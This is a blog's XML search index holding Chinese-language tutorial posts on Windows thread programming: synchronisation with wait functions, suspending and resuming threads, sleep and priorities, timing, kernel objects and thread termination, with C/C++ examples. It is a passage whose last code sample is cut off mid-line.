<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>线程-编码篇(四)</title>
      <link href="/2021/10/28/xian-cheng-bian-ma-pian-si/"/>
      <url>/2021/10/28/xian-cheng-bian-ma-pian-si/</url>
      
        <content type="html"><![CDATA[<h2 id="主线程和子线程执行顺序控制"><a href="#主线程和子线程执行顺序控制" class="headerlink" title="主线程和子线程执行顺序控制"></a>主线程和子线程执行顺序控制</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadPro(LPVOID lpParam);int main(int argc, char* argv[]){DWORD dwThreadId = 0;HANDLE hThreadex;unsigned int iThreadIdex;hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadPro, NULL, 0, &amp;iThreadIdex);//等待函数DWORD errNo = WaitForSingleObject(hThreadex, 10000);CloseHandle(hThreadex);for (int i = 0; i &lt; 200; i++){printf("world\n");}printf("--%x--", errNo);system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){for (int i = 0; i &lt; 200; i++){printf("hello\n");}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子线程间执行顺序控制"><a href="#子线程间执行顺序控制" class="headerlink" title="子线程间执行顺序控制"></a>子线程间执行顺序控制</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;//定义全局变量a、b和c，并赋初值 int a = 10; int b = 20; int c = 0; //定义两个全局的句柄，也可以定义成数组 HANDLE hThread1;HANDLE hThread2;DWORD WINAPI GetNum(LPVOID lpParam);DWORD WINAPI GetResult(LPVOID lpParam);int main(int argc, char* argv[]){DWORD dwThread = 0;HANDLE hThreadex;unsigned int iThreadIdex;hThread1 = CreateThread(NULL, NULL, GetResult, NULL, 0, NULL); hThread2 = CreateThread(NULL, NULL, GetNum, NULL, 0, NULL);//等待这两个线程执行完毕 WaitForSingleObject(hThread1, INFINITE);WaitForSingleObject(hThread2, INFINITE);//打印出最终结果 printf("%d + %d = %d\n", a, b, c);CloseHandle(hThread1);CloseHandle(hThread2);system("pause");return 0;}//下面这个函数用于给全局变量a和b赋值 DWORD WINAPI GetNum(LPVOID lpParam){ a = 100; b = 200; return 0; }//下面这个函数用于计算全局变量a和b的和，并把结果存放 在全局变量c中 DWORD WINAPI GetResult(LPVOID lpParam){ //等待函数WaitForSingleObject(hThread2, INFINITE); c = a + b; return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;//定义全局变量a、b和c，并赋初值 int a = 10; int b = 20; int c = 0; //定义成全局句柄数组 HANDLE hThread[2];DWORD WINAPI GetNum(LPVOID lpParam);DWORD WINAPI GetResult(LPVOID lpParam);int main(int argc, char* argv[]){DWORD dwThread = 0;HANDLE hThreadex;unsigned int iThreadIdex;hThread[0] = CreateThread(NULL, NULL, GetResult, NULL, 0, NULL); hThread[1] = CreateThread(NULL, NULL, GetNum, NULL, 0, NULL);//同时等待这两个线程执行完毕 DWORD errNo = WaitForMultipleObjects(2, hThread, true, INFINITE);//等待其中任何一个线程执行完毕//DWORD errNo = WaitForMultipleObjects(2, hThread, false, INFINITE);//打印出最终结果 printf("errNO = %d\n", errNo);CloseHandle(hThread[0]);CloseHandle(hThread[1]);system("pause");return 0;}//下面这个函数用于给全局变量a和b赋值 DWORD WINAPI GetNum(LPVOID lpParam){ a = 100; b = 200; return 0; }//下面这个函数用于计算全局变量a和b的和，并把结果存放 在全局变量c中 DWORD WINAPI GetResult(LPVOID lpParam){ //等待函数WaitForSingleObject(hThread[1], INFINITE); c = a + b; return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-编码篇(四) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-基础篇(四)</title>
      <link href="/2021/10/28/xian-cheng-ji-chu-pian-si/"/>
      <url>/2021/10/28/xian-cheng-ji-chu-pian-si/</url>
      
        <content type="html"><![CDATA[<h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单来说，就是线程之间的协调</p><h2 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h2><p>问题一：不同线程函数的执行必须有先后顺序</p><p>问题二：同一线程函数中一段代码必须作为一个单元执行</p><h2 id="简单的案例"><a href="#简单的案例" class="headerlink" title="简单的案例"></a>简单的案例</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261319083.png" alt="image-20211125203046330"></p><h2 id="等待函数"><a href="#等待函数" class="headerlink" title="等待函数"></a>等待函数</h2><pre class="line-numbers language-none"><code class="language-none">DWORD WaitForSingleObject(     HANDLE hHandle, //对象句柄     DWORD dwMilliseconds //等待时间,毫秒为单位,INFINITE一直等待 );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>hHandle</strong>：Event、Job、Memory resource notification、Mutex、Process、 Semaphore、Thread、Waitable timer等 </p><p>返回值的结果：</p><p><strong>WAIT_ABANDONED 0x00000080</strong>：当hHandle为mutex时，如果拥有mutex的线程在结束时没有释放内核对象会返回此返回值。 </p><p><strong>WAIT_OBJECT_0 0x00000000</strong> ：指定的对象发出有信号状态 </p><p><strong>WAIT_TIMEOUT 0x00000102</strong>：等待超时 </p><p><strong>WAIT_FAILED 0xFFFFFFFF</strong> ：出现错误，可通过GetLastError得到错误代码</p><p>等待多个对象</p><pre class="line-numbers language-none"><code class="language-none">DWORD WaitForMultipleObjects(     DWORD dwCount, //等待线程数量(最多MAXIMUM_WAIT_OBJECTS个，windows定义为64)     CONST HANDLE* phObjects, //线程句柄数组指针     BOOL fWaitAll, //是否等待全部     DWORD dwMilliseconds //等待时间INFINITE); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当参数fWaitAll为TRUE时，若所有线程均变为已通知状态则函数返回值为<code>WAIT_OBJECT_0</code></p><p>当参数fWaitAll为FALSE时，返回的值为线程内核对象数组的索引值</p><p>基本用法</p><pre class="line-numbers language-none"><code class="language-none">//定义两个全局的句柄，当然也可以定义成数组 HANDLE hThread[2]; int main(void) {     //创建两个线程     hThread[0] = CreateThread(NULL, NULL, GetResult, NULL, 0, NULL);     hThread[1] = CreateThread(NULL, NULL, GetNum, NULL, 0, NULL);     //等待这两个线程执行完毕     WaitForMultipleObjects(2, hThread, TRUE, INFINITE); //关闭句柄     CloseHandle(hThread1);     CloseHandle(hThread2);     return 0; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-基础篇(四) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-编码篇(三)</title>
      <link href="/2021/10/28/xian-cheng-bian-ma-pian-san/"/>
      <url>/2021/10/28/xian-cheng-bian-ma-pian-san/</url>
      
        <content type="html"><![CDATA[<h2 id="线程挂起-恢复"><a href="#线程挂起-恢复" class="headerlink" title="线程挂起-恢复"></a>线程挂起-恢复</h2><p>需要用到的Windows API：</p><pre class="line-numbers language-none"><code class="language-none">_beginthreadexSuspendThreadResumeThread<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>若是我们创建线程时就让它挂起，那么count 开始的值就是1</strong></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadPro(LPVOID lpParam);int main(void){HANDLE hThread;unsigned int iThreadIdex;//创建线程hThread = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadPro, NULL, 0, &amp;iThreadIdex);int count = 0;int count2 = 0;//挂起线程count = SuspendThread(hThread);printf("count = %d\n", count);//连续挂起线程count = SuspendThread(hThread);printf("count = %d\n", count);count = SuspendThread(hThread);printf("count = %d\n", count);//连续恢复线程count2 = ResumeThread(hThread);printf("count2 = %d\n", count2);count2 = ResumeThread(hThread);printf("count2 = %d\n", count2);count2 = ResumeThread(hThread);printf("count2 = %d\n", count2);CloseHandle(hThread);system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){for (int i = 0; i &lt; 2; i++){printf("hello\n");}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程睡眠-切换"><a href="#线程睡眠-切换" class="headerlink" title="线程睡眠-切换"></a>线程睡眠-切换</h2><p>我们在设置一下线程的优先级，看看具体的效果</p><p>实际上，还是有Windows操作系统的调度</p><p>涉及到的Windows API</p><pre class="line-numbers language-none"><code class="language-none">Sleep   SwitchToThread  SetThreadPriority<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadPro1(LPVOID lpParam);DWORD WINAPI ThreadPro2(LPVOID lpParam);int main(void){HANDLE hThread1;unsigned int iThreadIdex1;hThread1 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadPro1, NULL, 0, &amp;iThreadIdex1);SetThreadPriority(hThread1, THREAD_PRIORITY_ABOVE_NORMAL);CloseHandle(hThread1);HANDLE hThread2;unsigned int iThreadIdex2;hThread2 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadPro2, NULL, 0, &amp;iThreadIdex2);SetThreadPriority(hThread2, THREAD_PRIORITY_BELOW_NORMAL);CloseHandle(hThread2);system("pause");return 0;}DWORD WINAPI ThreadPro1(LPVOID lpParam){for (int i = 0; i &lt; 100; i++){printf("hello\n");//Sleep(0);Sleep(INFINITE);//SwitchToThread();}return 0;}DWORD WINAPI ThreadPro2(LPVOID lpParam){for (int i = 0; i &lt; 100; i++){printf("world\n");//Sleep(0);Sleep(1000);//SwitchToThread();}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程计时"><a href="#线程计时" class="headerlink" title="线程计时"></a>线程计时</h2><p>涉及到的API</p><p>注：得到的时间，只是一个参考</p><p><strong>因为操作系统在这中间，还会做其他事情</strong></p><pre class="line-numbers language-none"><code class="language-none">GetTickCount64 GetThreadTimes(较精确)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadPro1(LPVOID){ULONGLONG ullStart = 0;ULONGLONG ullEnd = 0;ullStart = GetTickCount64();for (int i = 0; i &lt; 100; i++){for (int j = 0; j &lt; 10; j++){//Sleep(10);printf("hello world\n");}}ullEnd = GetTickCount64();//两次记时取时差printf("用了%ul毫秒\n", ullEnd - ullStart);return 0;}int main(int argc, char* argv[]){HANDLE hThread1;unsigned int iThreadIdex1;hThread1 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadPro1, NULL, 0, &amp;iThreadIdex1);CloseHandle(hThread1);system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还调用了一个</p><pre class="line-numbers language-none"><code class="language-none">系统时间API:FileTimeToSystemTime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadPro1(LPVOID){//创建时间,结束时间,内核模式开始时间,内核模式结束时间,用户模式开始时间,用户模式结束时间FILETIME ftCreateTime, ftExitTime, ftKernelTimeStart, ftKernelTimeEnd, ftUserTimeStart, ftUserTimeEnd;//GetCurrentThread():获取当前线程的句柄GetThreadTimes(GetCurrentThread(), &amp;ftCreateTime, &amp;ftExitTime, &amp;ftKernelTimeStart, &amp;ftUserTimeStart);for (int i = 0; i &lt; 10; i++){for (int j = 0; j &lt; 100; j++){//Sleep(10);printf("hello world\n");}}//GetCurrentThread():获取当前线程的句柄GetThreadTimes(GetCurrentThread(), &amp;ftCreateTime, &amp;ftExitTime, &amp;ftKernelTimeEnd, &amp;ftUserTimeEnd);//时间转换SYSTEMTIME st1, st2;FILETIME ftCounter1;ftCounter1.dwHighDateTime = ftKernelTimeEnd.dwHighDateTime - ftKernelTimeStart.dwHighDateTime;ftCounter1.dwLowDateTime = ftKernelTimeEnd.dwLowDateTime - ftKernelTimeStart.dwLowDateTime;//FileTimeToSystemTime:系统时间FileTimeToSystemTime(&amp;ftCounter1, &amp;st1);//wSecond:秒//wMilliseconds:毫秒printf("%d.%d\n", st1.wSecond, st1.wMilliseconds);FILETIME ftCounter2;ftCounter2.dwHighDateTime = ftUserTimeEnd.dwHighDateTime - ftUserTimeStart.dwHighDateTime;ftCounter2.dwLowDateTime = ftUserTimeEnd.dwLowDateTime - ftUserTimeStart.dwLowDateTime;FileTimeToSystemTime(&amp;ftCounter2, &amp;st2);printf("%d.%d\n", st2.wSecond, st2.wMilliseconds);return 0;}int main(int argc, char* argv[]){HANDLE hThread1;unsigned int iThreadIdex1;hThread1 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadPro1, NULL, 0, &amp;iThreadIdex1);CloseHandle(hThread1);system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-编码篇(三) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-基础篇(三)</title>
      <link href="/2021/10/28/xian-cheng-ji-chu-pian-san/"/>
      <url>/2021/10/28/xian-cheng-ji-chu-pian-san/</url>
      
        <content type="html"><![CDATA[<h2 id="线程基本状态"><a href="#线程基本状态" class="headerlink" title="线程基本状态"></a>线程基本状态</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261319071.png" alt="image-20211125073020849"></p><h3 id="线程控制-挂起"><a href="#线程控制-挂起" class="headerlink" title="线程控制-挂起"></a>线程控制-挂起</h3><p>线程被挂起，就会进入阻塞态，当我们不唤醒，不能运行</p><p>调用一次，挂起一次，线程最多挂起<code>MAXIMUM_SUSPEND_COUNT</code>次，即127次，参考<code>winnt.h</code></p><p>线程挂起的风险：<strong>可能锁定堆</strong></p><pre class="line-numbers language-none"><code class="language-none">DWORD SuspendThread( HANDLE hThread //线程句柄 )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="线程控制-恢复"><a href="#线程控制-恢复" class="headerlink" title="线程控制-恢复"></a>线程控制-恢复</h3><p>运行次数和挂起次数一致</p><p>线程恢复后，从阻塞态进入就绪态，等待被执行</p><pre class="line-numbers language-none"><code class="language-none">DWORD ResumeThread(     HANDLE hThread //被挂起的线程句柄 )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="线程控制-睡眠"><a href="#线程控制-睡眠" class="headerlink" title="线程控制-睡眠"></a>线程控制-睡眠</h3><p>从运行态，进入阻塞态，到时间苏醒后，从阻塞态进入就绪态，等待被执行</p><p>Sleep函数本质：执行Sleep函数后，放弃当前的时间片</p><p>传入极值：<code>0/INFINITE</code></p><pre class="line-numbers language-none"><code class="language-none">VOID Sleep(     DWORD dwMilliseconds //睡眠时间，单位：毫秒 )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="线程控制-切换"><a href="#线程控制-切换" class="headerlink" title="线程控制-切换"></a>线程控制-切换</h3><p>本质：放弃自己当前轮转的时间片，让操作系统去执行一下其他的线程</p><p>返回值：切换失败返回<code>FALSE</code>，否则返回<code>TRUE</code></p><p><strong>概念：饥饿线程</strong></p><pre class="line-numbers language-none"><code class="language-none">BOOL SwitchToThread( ) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>思考：</p><p><code>Sleep</code>函数传入参数<code>0</code>与<code>SwitchToThread</code>的区别</p><p><code>Sleep 0</code>：执行Sleep 0之后，操作系统只会考虑和你同等级别的线程，如果没有，会优先执行你</p><p><code>SwitchToThread</code>：执行SwitchToThread之后，操作系统可以执行比当前线程级别更低的线程，只要是饥饿线程，都可以考虑</p><h2 id="线程执行时间"><a href="#线程执行时间" class="headerlink" title="线程执行时间"></a>线程执行时间</h2><p>主要是考虑到了效率的问题</p><p>两个函数的区别：<code>GetTickCount</code> 约49天溢出 ，因为<code>DWORD</code>是有范围的</p><p>返回值：从操作系统启动到现在的毫秒数</p><p>用法：两次记时取时差</p><pre class="line-numbers language-none"><code class="language-none">DWORD GetTickCount(VOID) ULONGLONG GetTickCount64(VOID)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>计量单位：100ns</p><p>用法：两次记时取时差</p><pre class="line-numbers language-none"><code class="language-none">BOOL GetThreadTimes(     HANDLE hThread, //线程句柄     PFILETIME pftCreationTime, //创建时间     PFILETIME pftExitTime, //退出时间     PFILETIME pftKernelTime, //内核模式下运行时间     PFILETIME pftUserTime //用户模式下运行时间)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="进程执行时间"><a href="#进程执行时间" class="headerlink" title="进程执行时间"></a>进程执行时间</h2><p>计量单位：100ns</p><p>用法：两次记时取时差</p><p>注：卡的是整个进程</p><pre class="line-numbers language-none"><code class="language-none">BOOL GetProcessTimes(     HANDLE hProcesss, //进程句柄     PFILETIME pftCreationTime, //创建时间     PFILETIME pftExitTime, //退出时间     PFILETIME pftKernelTime, //内核模式下运行时间     PFILETIME pftUserTime //用户模式下运行时间)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程内核对象"><a href="#线程内核对象" class="headerlink" title="线程内核对象"></a>线程内核对象</h2><ul><li>简单来说，内核对象就是用来记录<code>拥有内核对象的程序</code>的信息，它是一个结构体</li></ul><p>以线程内核对象为例子</p><ul><li>线程内核对象就是一个包含了线程状态信息的数据结构。每次对 <code>CreateThread</code>的成功调用，系统都会在内部为其分配一个内核对象</li></ul><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261319108.png" alt="image-20211125080206653"></p><ul><li><p>线程上下文CONTEXT，记录线程上次运行的寄存器状态，确保线程间切换时可以还原现场</p></li><li><p>使用计数Usage Count，初始值为2。每使用OpenThread打开一次，该值增加1，关闭一次减少1，当该值为0后，系统判定没有线程使用该对象，收回内存 </p></li><li><p>暂停次数<code>Suspend Count</code>，初始值为1，可以阻止新创建的线程被调度到CPU中。当内核对象初始化完毕后，该值自动减为0，此时线程是否执行取决于<code>CREATE_SUSPENDED</code>标志，该标志在创建线程时指定。通过<code>SuspendThread</code>挂起线程，它会使暂停次数加1，通过<code>ResumeThread</code>唤醒线程，它会使暂停次数减1</p></li><li><p>退出代码<code>Exit Code</code>，线程函数返回值返回前的值为<code>STILL_ACTIVE</code></p></li><li><p>是否受信<code>Signaled</code>，线程运行时为<code>FALSE</code>，线程运行结束后为<code>TRUE</code></p></li></ul><p>注：</p><pre class="line-numbers language-none"><code class="language-none">创建线程,Usage Count+1句柄打开,Usage Count+1Usage Count的初始值为2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的例子，Usage Count的初始值要设为2</p><pre class="line-numbers language-none"><code class="language-none">int main(void) {     HANDLE hCThread;     HANDLE hOThread;     DWORD dwThreadId;         hCThread = CreateThread(NULL, NULL, Fun, NULL, 0, &amp;dwThreadId);     hOThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);     CloseHandle(hCThread);     CloseHandle(hOThread);     return 0; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于上下文CONTEXT的操作，直接操作寄存器</p><p>注意：CONTEXT它本身是一个结构体</p><pre class="line-numbers language-none"><code class="language-none">CONTEXT Context; //定义对象SuspendThread(hThread); //挂起Context.ContextFlags = CONTEXT_CONTROL; //控制类型寄存器GetThreadContext(hThread, &amp;Context); //取出Context. xxx = xxx; ... SetThreadContext(hThread, &amp;Context); //设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-基础篇(三) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-编码篇(二)</title>
      <link href="/2021/10/28/xian-cheng-bian-ma-pian-er/"/>
      <url>/2021/10/28/xian-cheng-bian-ma-pian-er/</url>
      
        <content type="html"><![CDATA[<h2 id="测试进程优先级和线程优先级"><a href="#测试进程优先级和线程优先级" class="headerlink" title="测试进程优先级和线程优先级"></a>测试进程优先级和线程优先级</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt;int main(void){STARTUPINFO si1;PROCESS_INFORMATION pi1;ZeroMemory(&amp;si1, sizeof(si1));si1.cb = sizeof(si1);ZeroMemory(&amp;pi1, sizeof(pi1));STARTUPINFO si2;PROCESS_INFORMATION pi2;ZeroMemory(&amp;si2, sizeof(si2));si2.cb = sizeof(si2);ZeroMemory(&amp;pi2, sizeof(pi2));CreateProcess(NULL, "5x_demo1.exe", NULL, NULL, FALSE, 0, NULL, NULL, &amp;si1, &amp;pi1);//设置进程优先级SetPriorityClass(pi1.hProcess, IDLE_PRIORITY_CLASS);//锁定进程优先级//true:关闭动态调整SetProcessPriorityBoost(pi1.hProcess, true);CreateProcess(NULL, "5x_demo2.exe", NULL, NULL, FALSE, 0, NULL, NULL, &amp;si2, &amp;pi2);SetPriorityClass(pi2.hProcess, HIGH_PRIORITY_CLASS);WaitForSingleObject(pi1.hProcess, INFINITE);WaitForSingleObject(pi2.hProcess, INFINITE);CloseHandle(pi1.hProcess);CloseHandle(pi1.hThread);CloseHandle(pi2.hProcess);CloseHandle(pi2.hThread);system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试线程对象生命周期"><a href="#测试线程对象生命周期" class="headerlink" title="测试线程对象生命周期"></a>测试线程对象生命周期</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std;DWORD WINAPI ThreadPro(LPVOID lpParam);DWORD WINAPI ThreadProex(LPVOID lpParam);class Redamancy{public:Redamancy(int iX, int iY){m_iX = iX;m_iY = iY;cout &lt;&lt; m_iX &lt;&lt; "------" &lt;&lt; m_iY &lt;&lt; endl;}//析构函数~Redamancy(){cout &lt;&lt; m_iX &lt;&lt; "||||||" &lt;&lt; m_iY &lt;&lt; endl;}void printRedamancy(){cout &lt;&lt; m_iX &lt;&lt; "," &lt;&lt; m_iY &lt;&lt; endl;}private:int m_iX;int m_iY;};int main(int argc, char* argv[]){DWORD dwThreadId = 0;HANDLE hThread;hThread = CreateThread(NULL, NULL, ThreadPro, NULL, 0, &amp;dwThreadId);CloseHandle(hThread);HANDLE hThreadex;unsigned int iThreadIdex;hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, NULL, 0, &amp;iThreadIdex);CloseHandle(hThreadex);system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){Redamancy reda(1, 2);return 0;}DWORD WINAPI ThreadProex(LPVOID lpParam){Redamancy reda(3, 4);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结束线程"><a href="#结束线程" class="headerlink" title="结束线程"></a>结束线程</h2><p>自杀式结束线程：调用的API <code>ExitThread</code>，<code>_endthreadex</code>(推荐)，</p><p>线程退出时只运行了构造函数，并没有执行析构函数</p><p>他杀式结束线程：调用的API <code>TerminateThread</code></p><p>杀掉进程：调用的API <code>ExitProcess</code></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std;DWORD WINAPI ThreadPro(LPVOID lpParam);DWORD WINAPI ThreadProex(LPVOID lpParam);class Redamancy{public:Redamancy(int iX, int iY){m_iX = iX;m_iY = iY;cout &lt;&lt; m_iX &lt;&lt; "------" &lt;&lt; m_iY &lt;&lt; endl;}~Redamancy(){cout &lt;&lt; m_iX &lt;&lt; "||||||" &lt;&lt; m_iY &lt;&lt; endl;}void printRedamancy(){cout &lt;&lt; m_iX &lt;&lt; "," &lt;&lt; m_iY &lt;&lt; endl;}private:int m_iX;int m_iY;};int main(int argc, char* argv[]){DWORD dwThreadId = 0;HANDLE hThread;//杀掉进程ExitProcess(1);hThread = CreateThread(NULL, NULL, ThreadPro, NULL, 0, &amp;dwThreadId);//他杀式结束线程//TerminateThread(hThread, 1);CloseHandle(hThread);HANDLE hThreadex;unsigned int iThreadIdex;//杀掉进程ExitProcess(1);hThreadex = (HANDLE)_beginthreadex(NULL, NULL, 